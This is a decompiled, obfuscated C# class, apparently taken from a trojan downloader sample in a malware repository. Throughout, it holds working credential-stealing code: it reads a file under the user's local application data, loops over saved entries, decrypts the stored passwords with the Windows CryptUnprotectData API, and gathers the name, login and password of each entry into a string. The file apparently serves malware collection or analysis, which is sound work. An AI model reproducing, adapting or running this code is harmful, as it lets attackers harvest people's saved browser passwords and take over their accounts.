// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Client, Version=1.0.0.0, Culture=neutral, PublicKeyToken=f0f23b7759753841
// MVID: 88398440-486F-46D0-BB45-521B8EE8871E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\Trojan-Downloader.MSIL.Agent.dpv-1fc722c8c40a50aaf248839f7da26ad37a11b67963cf37e94fefd262632ab6b2.exe

using \u000F\u0015;
using \u0011\u0015;
using \u0016\u0015;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;

namespace \u0016\u0015
{
  internal sealed class \u0019\u0015
  {
    [NonSerialized]
    internal static \u000E\u0015 \u0001;
    public static string \u0001;
    public static object \u0002;

    static \u0019\u0015()
    {
      \u0012\u0015.\u0006\u0017(typeof (\u0019\u0015));
      \u0019\u0015.\u0002 = (object) \u0019\u0015.\u0001(1006);
    }

    public static void \u001A\u0017()
    {
      string str1 = \u0099\u0002.\u0018\u0003(\u001A\u0004.\u0010\u0004(Environment.SpecialFolder.LocalApplicationData), \u0019\u0015.\u0001(1055));
      try
      {
        \u0001\u0017 obj = new \u0001\u0017(str1);
        obj.\u0019\u001D(\u0019\u0015.\u0001(1116));
        if (!\u008C\u0005.\u001B\u0006(str1))
          return;
        int num1 = checked (obj.\u001A\u001D() - 1);
        int num2 = 0;
        while (num2 <= num1)
        {
          string str2 = obj.\u001B\u001D(num2, \u0019\u0015.\u0001(1125));
          string str3 = obj.\u001B\u001D(num2, \u0019\u0015.\u0001(1142));
          string str4 = \u0019\u0015.\u001C\u0017(\u001D\u0005.\u007E\u0082\u0005((object) \u0005\u0005.\u0083\u0005(), obj.\u001B\u001D(num2, \u0019\u0015.\u0001(1163))));
          if (\u0092\u0003.\u0005\u0002(str3, \u0019\u0015.\u0001(1005), false) != 0 & \u0092\u0003.\u0005\u0002(str4, \u0019\u0015.\u0001(1005), false) != 0)
          {
            string[] strArray = new string[7]
            {
              \u0019\u0015.\u0001(1184),
              str2,
              \u0019\u0015.\u0001(1197),
              str3,
              \u0019\u0015.\u0001(1214),
              str4,
              \u0019\u0015.\u0001(1231)
            };
            \u0019\u0015.\u0001 = \u0089\u0003.\u001B\u0003(strArray);
            \u0019\u0015.\u0002 = \u0090\u0004.\u0006\u0002(\u0019\u0015.\u0002, (object) \u0019\u0015.\u0001);
          }
          checked { ++num2; }
        }
        \u0019\u0015.\u0002 = \u0090\u0004.\u0006\u0002(\u0019\u0015.\u0002, (object) \u0019\u0015.\u0001(1236));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0019\u0005.\u000E\u0002();
      }
    }

    [DllImport("Crypt32.dll", EntryPoint = "CryptUnprotectData", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool \u001B\u0017(
      [In] ref \u0019\u0015.\u001C\u0015 obj0,
      [In] string obj1,
      [In] ref \u0019\u0015.\u001C\u0015 obj2,
      [In] IntPtr obj3,
      [In] ref \u0019\u0015.\u001B\u0015 obj4,
      [In] int obj5,
      [In] ref \u0019\u0015.\u001C\u0015 obj6);

    public static string \u001C\u0017([In] byte[] obj0)
    {
      \u0019\u0015.\u001C\u0015 obj1 = new \u0019\u0015.\u001C\u0015();
      \u0019\u0015.\u001C\u0015 obj2 = new \u0019\u0015.\u001C\u0015();
      GCHandle gcHandle = \u0097\u0003.\u0098\u0005((object) obj0, GCHandleType.Pinned);
      obj1.\u0002 = gcHandle.AddrOfPinnedObject();
      obj1.\u0001 = obj0.Length;
      gcHandle.Free();
      ref \u0019\u0015.\u001C\u0015 local1 = ref obj1;
      \u0019\u0015.\u001C\u0015 obj3;
      \u0019\u0015.\u001C\u0015 obj4 = obj3;
      ref \u0019\u0015.\u001C\u0015 local2 = ref obj4;
      IntPtr num1;
      IntPtr num2 = num1;
      \u0019\u0015.\u001B\u0015 obj5;
      \u0019\u0015.\u001B\u0015 obj6 = obj5;
      ref \u0019\u0015.\u001B\u0015 local3 = ref obj6;
      ref \u0019\u0015.\u001C\u0015 local4 = ref obj2;
      \u0019\u0015.\u001B\u0017(ref local1, (string) null, ref local2, num2, ref local3, 0, ref local4);
      byte[] numArray = new byte[checked (obj2.\u0001 + 1)];
      \u0010\u0004.\u009E\u0005(obj2.\u0002, numArray, 0, obj2.\u0001);
      string str = \u0011\u0003.\u007E\u0084\u0005((object) \u0005\u0005.\u0083\u0005(), numArray);
      return \u0096\u0004.\u007E\u0006\u0003((object) str, 0, checked (\u0090\u0005.\u007E\u0003\u0003((object) str) - 1));
    }

    [Flags]
    public enum \u001A\u0015
    {
      \u0001 = 1,
      \u0002 = 2,
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct \u001B\u0015
    {
      public int \u0001;
      public \u0019\u0015.\u001A\u0015 \u0002;
      public IntPtr \u0003;
      public string \u0004;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct \u001C\u0015
    {
      public int \u0001;
      public IntPtr \u0002;
    }
  }
}
